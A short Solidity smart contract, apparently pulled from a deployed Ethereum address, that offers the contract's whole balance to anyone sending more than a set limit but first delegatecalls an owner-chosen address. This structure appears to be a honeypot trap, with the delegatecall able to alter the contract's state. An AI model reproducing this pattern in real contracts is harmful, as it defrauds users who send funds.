/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract Conductor at 0xff5a11c0442028ee2a60d31e6ebb3cbac121ffe5
*/
pragma solidity ^0.4.18;


contract Conductor
{
    address public Owner = msg.sender;
    address public DataBase;
    uint256 public Limit;
    
    
    function Set(address dataBase, uint256 limit)
    {
        require(msg.sender == Owner);
        Limit = limit;
        DataBase = dataBase;
    }
    
    function()payable{}
    
    function transfer(address adr)
    payable
    {
        if(msg.value>Limit)
        {        
            DataBase.delegatecall(bytes4(sha3("AddToDB(address)")),msg.sender);
            adr.transfer(this.balance);
        }
    }
    
}